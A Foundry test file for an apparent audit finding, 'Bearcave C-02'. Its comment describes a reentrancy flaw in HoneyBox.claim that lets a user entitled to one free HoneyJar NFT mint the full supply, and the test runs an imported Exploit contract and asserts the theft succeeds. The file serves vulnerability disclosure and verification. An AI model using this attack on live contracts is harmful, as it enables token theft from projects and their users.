// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, HoneyBox, HoneyJar, Gatekeeper} from "./20530-c-02-reentrancy-allows-any-user-allowed-even-one-free-honeyj.sol";

// Bearcave C-02 (finding 20530): `HoneyBox.claim` mints HoneyJar NFTs via the
// unsafe `safeMint` external call BEFORE updating `claimed[bundleId_]` and
// before recording the claim in the Gatekeeper. An attacker entitled to ONE
// free HoneyJar re-enters `claim` from `onERC721Received` and mints the entire
// `maxHoneyJar` supply (10) for free.
contract Finding20530Test is Test {
    function test_exploit_reentrancy_mintsFullSupplyForFree() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("entitled to", e.entitledTo());
        emit log_named_uint("minted (stolen)", e.minted());
        emit log_named_uint("profit (free HoneyJars)", e.profit());

        assertEq(e.entitledTo(), 1, "attacker was entitled to exactly 1 free HoneyJar");
        assertEq(e.minted(), 10, "attacker minted the full maxHoneyJar supply");
        assertGt(e.profit(), e.entitledTo(), "attacker minted far beyond entitlement, all for free");
    }
}
